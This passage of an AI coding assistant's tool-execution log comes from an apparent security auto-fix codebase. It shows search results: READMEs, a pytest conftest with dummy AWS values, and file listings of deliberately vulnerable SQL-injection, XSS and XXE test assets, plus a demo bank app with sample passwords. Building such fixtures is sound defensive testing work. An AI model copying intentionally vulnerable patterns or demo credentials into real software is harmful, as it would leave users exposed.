Detection","lineNumber":25},{"lineNumber":26},{"text":"### More Safe Code Examples","lineNumber":27},{"text":"\`\`\`{language}","lineNumber":28},{"text":"// Add more safe code example here or refer to previous examples","lineNumber":29},{"text":"\`\`\`","lineNumber":30},{"lineNumber":31},{"text":"### Detected by","lineNumber":32},{"lineNumber":33},{"text":"* [Add screenshots from highlight nodes here]","lineNumber":34},{"lineNumber":35},{"text":"### Respected by","lineNumber":36},{"lineNumber":37},{"text":"* SAST provider name","lineNumber":38},{"text":"* ...","lineNumber":39},{"lineNumber":40},{"text":"## 5. Other Information","lineNumber":41},{"lineNumber":42},{"text":"### Required Imports and Packages","lineNumber":43},{"lineNumber":44},{"text":"None","lineNumber":45},{"lineNumber":46},{"text":"### User Questions","lineNumber":47},{"lineNumber":48},{"text":"None","lineNumber":49},{"lineNumber":50},{"text":"### Open Items","lineNumber":51},{"lineNumber":52},{"text":"None","lineNumber":53},{"lineNumber":54},{"text":"### Read More","lineNumber":55},{"lineNumber":56},{"text":"* https://deu.ast.checkmarx.net/presets/sast","lineNumber":57},{"text":"* https://codeql.github.com/codeql-query-help/python/","lineNumber":58},{"text":"* https://vulncat.fortify.com/en/weakness?codelang=Java%2FJSP&q=System%20Information%20Leak","lineNumber":59},{"text":"* https://semgrep.dev/r?q=html.security.audit.missing-integrity.missing-integrity","lineNumber":60},{"text":"* https://docs.snyk.io/scan-with-snyk/snyk-code/snyk-code-security-rules/python-rules","lineNumber":61},{"text":"* https://rules.sonarsource.com/python/","lineNumber":62}]},"score":0.2715897858142853},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/python/wildcard_imports/README.md","range":{"startPosition":{},"endPosition":{"line":50}},"contents":"# Python Wildcard Import Test Cases\\n\\nThis directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\n\\n## Test Cases\\n\\n### 1. basic_math\\n- **File**: \`calculator.py\`\\n- **Description**: Basic usage of wildcard import from the \`math\` module\\n- **Pattern**: \`from math import *\`\\n- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\n\\n### 2. collections_abc\\n- **File**: \`containers.py\`\\n- **Description**: Wildcard imports from \`collections\` and abstract base classes\\n- **Patterns**: \\n  - \`from collections import *\`\\n  - \`from collections.abc import *\`\\n  - \`from abc import *\`\\n- **Usage**: Container types, abstract base classes, decorators\\n\\n### 3. datetime_time\\n- **File**: \`scheduler.py\`\\n- **Description**: Time and date manipulation with multiple wildcard imports\\n- **Patterns**:\\n  - \`from datetime import *\`\\n  - \`from time import *\`\\n  - \`from calendar import *\`\\n- **Usage**: Scheduling, time zones, calendar operations\\n\\n### 4. fabric_deployment\\n- **File**: \`deploy.py\`\\n- **Description**: Real-world deployment script using Fabric with extensive functionality\\n- **Pattern**: \`from fabric.api import *\`\\n- **Usage**: Server deployment automation with 400+ lines of deployment logic\\n- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\n\\n### 5. local_package\\n- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\n- **Description**: Wildcard imports from local modules in the same package\\n- **Patterns**:\\n  - \`from utils import *\`\\n  - \`from helpers import *\`\\n- **Usage**: Application using various utilities and helper functions from local modules\\n\\n### 6. mixed_imports\\n- **File**: \`hybrid_imports.py\`\\n- **Description**: Mixing wildcard imports with explicit imports\\n","originalContents":"# Python Wildcard Import Test Cases\\n\\nThis directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.\\n\\n## Test Cases\\n\\n### 1. basic_math\\n- **File**: \`calculator.py\`\\n- **Description**: Basic usage of wildcard import from the \`math\` module\\n- **Pattern**: \`from math import *\`\\n- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`\\n\\n### 2. collections_abc\\n- **File**: \`containers.py\`\\n- **Description**: Wildcard imports from \`collections\` and abstract base classes\\n- **Patterns**: \\n  - \`from collections import *\`\\n  - \`from collections.abc import *\`\\n  - \`from abc import *\`\\n- **Usage**: Container types, abstract base classes, decorators\\n\\n### 3. datetime_time\\n- **File**: \`scheduler.py\`\\n- **Description**: Time and date manipulation with multiple wildcard imports\\n- **Patterns**:\\n  - \`from datetime import *\`\\n  - \`from time import *\`\\n  - \`from calendar import *\`\\n- **Usage**: Scheduling, time zones, calendar operations\\n\\n### 4. fabric_deployment\\n- **File**: \`deploy.py\`\\n- **Description**: Real-world deployment script using Fabric with extensive functionality\\n- **Pattern**: \`from fabric.api import *\`\\n- **Usage**: Server deployment automation with 400+ lines of deployment logic\\n- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\n\\n### 5. local_package\\n- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\n- **Description**: Wildcard imports from local modules in the same package\\n- **Patterns**:\\n  - \`from utils import *\`\\n  - \`from helpers import *\`\\n- **Usage**: Application using various utilities and helper functions from local modules\\n\\n### 6. mixed_imports\\n- **File**: \`hybrid_imports.py\`\\n- **Description**: Mixing wildcard imports with explicit imports\\n","detailedLines":[{"text":"# Python Wildcard Import Test Cases","lineNumber":1},{"lineNumber":2},{"text":"This directory contains various test cases demonstrating different patterns of wildcard imports (\`from module import *\`) in Python. These examples are used to test the wildcard import analyzer and fixer.","lineNumber":3},{"lineNumber":4},{"text":"## Test Cases","lineNumber":5},{"lineNumber":6},{"text":"### 1. basic_math","lineNumber":7},{"text":"- **File**: \`calculator.py\`","lineNumber":8},{"text":"- **Description**: Basic usage of wildcard import from the \`math\` module","lineNumber":9},{"text":"- **Pattern**: \`from math import *\`","lineNumber":10},{"text":"- **Usage**: Mathematical functions like \`sin()\`, \`cos()\`, \`sqrt()\`, \`exp()\`, constants like \`pi\`, \`e\`","lineNumber":11},{"lineNumber":12},{"text":"### 2. collections_abc","lineNumber":13},{"text":"- **File**: \`containers.py\`","lineNumber":14},{"text":"- **Description**: Wildcard imports from \`collections\` and abstract base classes","lineNumber":15},{"text":"- **Patterns**: ","lineNumber":16},{"text":"  - \`from collections import *\`","lineNumber":17},{"text":"  - \`from collections.abc import *\`","lineNumber":18},{"text":"  - \`from abc import *\`","lineNumber":19},{"text":"- **Usage**: Container types, abstract base classes, decorators","lineNumber":20},{"lineNumber":21},{"text":"### 3. datetime_time","lineNumber":22},{"text":"- **File**: \`scheduler.py\`","lineNumber":23},{"text":"- **Description**: Time and date manipulation with multiple wildcard imports","lineNumber":24},{"text":"- **Patterns**:","lineNumber":25},{"text":"  - \`from datetime import *\`","lineNumber":26},{"text":"  - \`from time import *\`","lineNumber":27},{"text":"  - \`from calendar import *\`","lineNumber":28},{"text":"- **Usage**: Scheduling, time zones, calendar operations","lineNumber":29},{"lineNumber":30},{"text":"### 4. fabric_deployment","lineNumber":31},{"text":"- **File**: \`deploy.py\`","lineNumber":32},{"text":"- **Description**: Real-world deployment script using Fabric with extensive functionality","lineNumber":33},{"text":"- **Pattern**: \`from fabric.api import *\`","lineNumber":34},{"text":"- **Usage**: Server deployment automation with 400+ lines of deployment logic","lineNumber":35},{"text":"- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import","lineNumber":36},{"lineNumber":37},{"text":"### 5. local_package","lineNumber":38},{"text":"- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`","lineNumber":39},{"text":"- **Description**: Wildcard imports from local modules in the same package","lineNumber":40},{"text":"- **Patterns**:","lineNumber":41},{"text":"  - \`from utils import *\`","lineNumber":42},{"text":"  - \`from helpers import *\`","lineNumber":43},{"text":"- **Usage**: Application using various utilities and helper functions from local modules","lineNumber":44},{"lineNumber":45},{"text":"### 6. mixed_imports","lineNumber":46},{"text":"- **File**: \`hybrid_imports.py\`","lineNumber":47},{"text":"- **Description**: Mixing wildcard imports with explicit imports","lineNumber":48},{"text":"- **Patterns**:","lineNumber":49},{"text":"  - Explicit: \`from collections import Counter, defaultdict\`","lineNumber":50}]},"score":0.2711057662963867},{"codeBlock":{"relativeWorkspacePath":"consumers/analyzer/tests/assets/java/sqli/e-1578/source/README.md","range":{"startPosition":{},"endPosition":{"line":68}},"contents":"# My Demo Bank App\\n\\nA modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\n\\n## Overview\\n\\nMy Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\n\\n## 🎯 Purpose\\n\\nThis application is designed for:\\n- Learning web development with Spring Boot\\n- Demonstrating banking application features\\n- Portfolio demonstration\\n- Educational purposes\\n- Understanding database interactions\\n\\n## 🛠️ Features\\n\\n### Core Banking Functionality\\n- **User Authentication** - Secure login system\\n- **Account Management** - Multiple account types (checking, savings, investment)\\n- **Money Transfers** - Transfer funds between accounts\\n- **Credit Card Applications** - Apply for various credit card products\\n- **Application Search** - Search through credit applications\\n- **Dashboard** - Comprehensive overview of accounts and activities\\n\\n### Technical Features\\n- **Spring Boot** - Modern Java web framework\\n- **H2 Database** - In-memory database for easy setup\\n- **Thymeleaf** - Server-side templating\\n- **Responsive Design** - Works on all device sizes\\n- **Professional UI** - Clean, modern interface\\n\\n## 🚀 Quick Start\\n\\n### Prerequisites\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n### Running the Application\\n\\n1. **Clone the repository**\\n   \`\`\`bash\\n   git clone <repository-url>\\n   cd my-demo-bank-app\\n   \`\`\`\\n\\n2. **Build the application**\\n   \`\`\`bash\\n   mvn clean install\\n   \`\`\`\\n\\n3. **Run the application**\\n   \`\`\`bash\\n   mvn spring-boot:run\\n   \`\`\`\\n\\n4. **Access the application**\\n   - Open your browser and go to: \`http://localhost:8080\`\\n   - Use the demo accounts provided on the login page\\n\\n### Demo Accounts\\n\\n| Username | Password | Description |\\n|----------|----------|-------------|\\n| alice | password123 | Customer with multiple accounts |\\n","originalContents":"# My Demo Bank App\\n\\nA modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\n\\n## Overview\\n\\nMy Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\n\\n## 🎯 Purpose\\n\\nThis application is designed for:\\n- Learning web development with Spring Boot\\n- Demonstrating banking application features\\n- Portfolio demonstration\\n- Educational purposes\\n- Understanding database interactions\\n\\n## 🛠️ Features\\n\\n### Core Banking Functionality\\n- **User Authentication** - Secure login system\\n- **Account Management** - Multiple account types (checking, savings, investment)\\n- **Money Transfers** - Transfer funds between accounts\\n- **Credit Card Applications** - Apply for various credit card products\\n- **Application Search** - Search through credit applications\\n- **Dashboard** - Comprehensive overview of accounts and activities\\n\\n### Technical Features\\n- **Spring Boot** - Modern Java web framework\\n- **H2 Database** - In-memory database for easy setup\\n- **Thymeleaf** - Server-side templating\\n- **Responsive Design** - Works on all device sizes\\n- **Professional UI** - Clean, modern interface\\n\\n## 🚀 Quick Start\\n\\n### Prerequisites\\n- Java 17 or higher\\n- Maven 3.6 or higher\\n\\n### Running the Application\\n\\n1. **Clone the repository**\\n   \`\`\`bash\\n   git clone <repository-url>\\n   cd my-demo-bank-app\\n   \`\`\`\\n\\n2. **Build the application**\\n   \`\`\`bash\\n   mvn clean install\\n   \`\`\`\\n\\n3. **Run the application**\\n   \`\`\`bash\\n   mvn spring-boot:run\\n   \`\`\`\\n\\n4. **Access the application**\\n   - Open your browser and go to: \`http://localhost:8080\`\\n   - Use the demo accounts provided on the login page\\n\\n### Demo Accounts\\n\\n| Username | Password | Description |\\n|----------|----------|-------------|\\n| alice | password123 | Customer with multiple accounts |\\n","detailedLines":[{"text":"# My Demo Bank App","lineNumber":1},{"lineNumber":2},{"text":"A modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.","lineNumber":3},{"lineNumber":4},{"text":"## Overview","lineNumber":5},{"lineNumber":6},{"text":"My Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.","lineNumber":7},{"lineNumber":8},{"text":"## 🎯 Purpose","lineNumber":9},{"lineNumber":10},{"text":"This application is designed for:","lineNumber":11},{"text":"- Learning web development with Spring Boot","lineNumber":12},{"text":"- Demonstrating banking application features","lineNumber":13},{"text":"- Portfolio demonstration","lineNumber":14},{"text":"- Educational purposes","lineNumber":15},{"text":"- Understanding database interactions","lineNumber":16},{"lineNumber":17},{"text":"## 🛠️ Features","lineNumber":18},{"lineNumber":19},{"text":"### Core Banking Functionality","lineNumber":20},{"text":"- **User Authentication** - Secure login system","lineNumber":21},{"text":"- **Account Management** - Multiple account types (checking, savings, investment)","lineNumber":22},{"text":"- **Money Transfers** - Transfer funds between accounts","lineNumber":23},{"text":"- **Credit Card Applications** - Apply for various credit card products","lineNumber":24},{"text":"- **Application Search** - Search through credit applications","lineNumber":25},{"text":"- **Dashboard** - Comprehensive overview of accounts and activities","lineNumber":26},{"lineNumber":27},{"text":"### Technical Features","lineNumber":28},{"text":"- **Spring Boot** - Modern Java web framework","lineNumber":29},{"text":"- **H2 Database** - In-memory database for easy setup","lineNumber":30},{"text":"- **Thymeleaf** - Server-side templating","lineNumber":31},{"text":"- **Responsive Design** - Works on all device sizes","lineNumber":32},{"text":"- **Professional UI** - Clean, modern interface","lineNumber":33},{"lineNumber":34},{"text":"## 🚀 Quick Start","lineNumber":35},{"lineNumber":36},{"text":"### Prerequisites","lineNumber":37},{"text":"- Java 17 or higher","lineNumber":38},{"text":"- Maven 3.6 or higher","lineNumber":39},{"lineNumber":40},{"text":"### Running the Application","lineNumber":41},{"lineNumber":42},{"text":"1. **Clone the repository**","lineNumber":43},{"text":"   \`\`\`bash","lineNumber":44},{"text":"   git clone <repository-url>","lineNumber":45},{"text":"   cd my-demo-bank-app","lineNumber":46},{"text":"   \`\`\`","lineNumber":47},{"lineNumber":48},{"text":"2. **Build the application**","lineNumber":49},{"text":"   \`\`\`bash","lineNumber":50},{"text":"   mvn clean install","lineNumber":51},{"text":"   \`\`\`","lineNumber":52},{"lineNumber":53},{"text":"3. **Run the application**","lineNumber":54},{"text":"   \`\`\`bash","lineNumber":55},{"text":"   mvn spring-boot:run","lineNumber":56},{"text":"   \`\`\`","lineNumber":57},{"lineNumber":58},{"text":"4. **Access the application**","lineNumber":59},{"text":"   - Open your browser and go to: \`http://localhost:8080\`","lineNumber":60},{"text":"   - Use the demo accounts provided on the login page","lineNumber":61},{"lineNumber":62},{"text":"### Demo Accounts","lineNumber":63},{"lineNumber":64},{"text":"| Username | Password | Description |","lineNumber":65},{"text":"|----------|----------|-------------|","lineNumber":66},{"text":"| alice | password123 | Customer with multiple accounts |","lineNumber":67},{"text":"| bob | pass456 | Customer with basic accounts |","lineNumber":68}]},"score":0.2711007595062256},{"codeBlock":{"relativeWorkspacePath":"pycommon/tests/conftest.py","range":{"startPosition":{},"endPosition":{"line":73}},"contents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","originalContents":"import os\\nimport pathlib\\n\\nimport pytest\\nfrom aioresponses import aioresponses\\n\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"\\n)\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"\\n)\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\n    ROOT_REPO_DIR\\n    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"\\n)\\nTESTS_DIR = pathlib.Path(__file__).parent\\n\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"\\nREPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"\\nASSETS_DIR = TESTS_DIR / \\"assets\\"\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"\\n\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"\\nSAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"\\n\\n\\n@pytest.fixture\\ndef aiohttp_session():\\n    with aioresponses() as session:\\n        yield session","detailedLines":[{"text":"import os","lineNumber":1},{"text":"import pathlib","lineNumber":2},{"lineNumber":3},{"text":"import pytest","lineNumber":4},{"text":"from aioresponses import aioresponses","lineNumber":5},{"lineNumber":6},{"text":"ROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent","lineNumber":7},{"text":"WEBGOAT_CHECKMARX_TEST_REPORT_PATH = (","lineNumber":8},{"text":"    ROOT_REPO_DIR","lineNumber":9},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\"","lineNumber":10},{"text":")","lineNumber":11},{"text":"WEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (","lineNumber":12},{"text":"    ROOT_REPO_DIR","lineNumber":13},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\"","lineNumber":14},{"text":")","lineNumber":15},{"text":"JUICE_SHOP_SNYK_TEST_REPORT_PATH = (","lineNumber":16},{"text":"    ROOT_REPO_DIR","lineNumber":17},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\"","lineNumber":18},{"text":")","lineNumber":19},{"text":"JUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (","lineNumber":20},{"text":"    ROOT_REPO_DIR","lineNumber":21},{"text":"    / \\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\"","lineNumber":22},{"text":")","lineNumber":23},{"text":"TESTS_DIR = pathlib.Path(__file__).parent","lineNumber":24},{"lineNumber":25},{"text":"TEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\"__tests__/files\\"","lineNumber":26},{"text":"TEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\"webgoat\\"","lineNumber":27},{"text":"REPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\"repo.zip\\"","lineNumber":28},{"text":"REPO1_VUL_REPORT = TEST_DATA_SOURCE / \\"altoroj.json\\"","lineNumber":29},{"text":"REPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\"altoroj/sonarqube.json\\"","lineNumber":30},{"text":"REPO1_ORIGINAL_URL = \\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\"","lineNumber":31},{"text":"ASSETS_DIR = TESTS_DIR / \\"assets\\"","lineNumber":32},{"text":"BUGSY_SOURCE = TESTS_DIR.parent.parent / \\"clients/cli\\"","lineNumber":33},{"lineNumber":34},{"text":"SAMPLE_JAVA_FILE = TESTS_DIR / \\"assets/sample.java\\"","lineNumber":35},{"text":"SAMPLE_JSP_FILE = TESTS_DIR / \\"assets/sample.jsp\\"","lineNumber":36},{"lineNumber":37},{"lineNumber":38},{"text":"@pytest.fixture","lineNumber":39},{"text":"def aiohttp_session():","lineNumber":40,"isSignature":true},{"text":"    with aioresponses() as session:","lineNumber":41},{"text":"        yield session","lineNumber":42,"isSignature":true},{"lineNumber":43},{"lineNumber":44},{"text":"@pytest.fixture(autouse=True, scope=\\"session\\")","lineNumber":45},{"text":"def mock_env_values_for_py_common():","lineNumber":46,"isSignature":true},{"text":"    os.environ[\\"AWS_S3_ACCESS_KEY_ID\\"] = \\"DUMMY_AWS_S3_ACCESS_KEY_ID\\"","lineNumber":47}]},"score":0.2702752351760864}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.735Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "glob_file_search",
          "parameters": "{"globPattern":"**/*sample*"}",
          "rawArguments": "{"glob_pattern": "*sample*"}",
          "result": "{"directories":[{"absPath":"/Users/jonathanafek/src/autofixer","files":[{"relPath":"patchino/patchino/sampler.py"},{"relPath":"patchino/ai-playground/src/screens/Sampler.tsx"},{"relPath":"pycommon/tests/assets/sample_semgrep_report.json"},{"relPath":"pycommon/tests/assets/sample_datadog_report.json"},{"relPath":"patchino/example_sampler_config.json"},{"relPath":"patchino/patchino/backend/mutations/run_sampler.py"},{"relPath":"clients/cli/__tests__/mcp/mocks/sample.gitignore"},{"relPath":"patchino/_samples/samples.json"},{"relPath":"pycommon/tests/assets/sample.jsp"},{"relPath":"pycommon/tests/assets/sample.java"},{"relPath":"consumers/report_init/tests/files/sample-repo.zip"}],"totalFiles":11}]}",
        },
        "type": "TOOL_EXECUTION",
      },
      {
        "attachedFiles": [],
        "date": 2025-10-29T16:47:51.772Z,
        "text": "",
        "tokens": {
          "inputCount": 0,
          "outputCount": 0,
        },
        "tool": {
          "accepted": false,
          "name": "glob_file_search",
          "parameters": "{"globPattern":"**/*example*"}",
          "rawArguments": "{"glob_pattern": "*example*"}",
          "result": "{"directories":[{"absPath":"/Users/jonathanafek/src/autofixer","files":[{"relPath":"consumers/analyzer/tests/assets/java/sqli/statement_in_class_def/source/src/main/java/SQLInjectionExample.java"},{"relPath":"patchino/example_sampler_config.json"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitUnmarshalHttpResponse.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalFile.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/fp_example.py"},{"relPath":"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/example.py"},{"relPath":"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/class_example.py"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_vendor_code/repo/vendor/xss-example.js"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_test_code/repo/test/xss-example.js"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_auxiliary_code/repo/scripts/xss-example.js"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalSource.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalFile.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalSource.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalFile.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java"},{"relPath":"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitMarshal.java"},{"relPath":"consumers/analyzer/tests/assets/java/insecure_randomness/e-1056/source/src/main/java/InsecureRandomnessExample.java"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/e-1077/source/SerilogExampleWithoutLogger.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/e-1077/source/SerilogExampleWithLogger.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/TraceSourceExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/SerilogExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/NLogExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/Log4NetExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/use_of_console_out/basic/source/ILoggerExample.cs"},{"relPath":"consumers/analyzer/tests/assets/java/insecure_randomness/basic/source/src/main/java/InsecureRandomnessExample.java"},{"relPath":"consumers/analyzer/tests/assets/csharp/unvalidated_public_method_argument/source/UnvalidatedArgumentsExample.cs"},{"relPath":"clients/cli/__tests__/assets/github_fixer_demo/repo/xss-example.js"},{"relPath":"pycommon/tests/assets/e-840/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/e-844/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/dead_code_unused_field/should_not_delete/source/src/main/java/DeadFieldExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/dead_code_unused_field/should_delete/source/src/main/java/DeadFieldExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/prepare-statement-var-in-values/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/enquote-identifier-simple/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/insecure_cookie/http_only/source/src/main/java/BasicClientCookieExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/e-565/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/csharp/system-information-leak/one-var-no-logger/source/NoLoggerExample.cs"},{"relPath":"consumers/analyzer/tests/assets/csharp/system-information-leak/one-var-logger/source/ILoggerExample.cs"},{"relPath":"consumers/analyzer/tests/assets/java/xss/e-424-direct-ResponseEntity/source/src/main/java/app/ExampleController.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-prepared-statement-in-try/source/src/main/java/SQLInjectionExample.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher-multiple-files/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-no-patcher-multiple-files/source/src/main/java/app/ExampleArg.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-concat-different-file/source/src/main/java/app/ExampleController2.java"},{"relPath":"consumers/analyzer/tests/assets/java/xss/Spring-return-concat-different-file/source/src/main/java/app/ExampleConcat.java"},{"relPath":"consumers/analyzer/tests/assets/java/sqli/one-tainted-var-add-batch-single-call/source/src/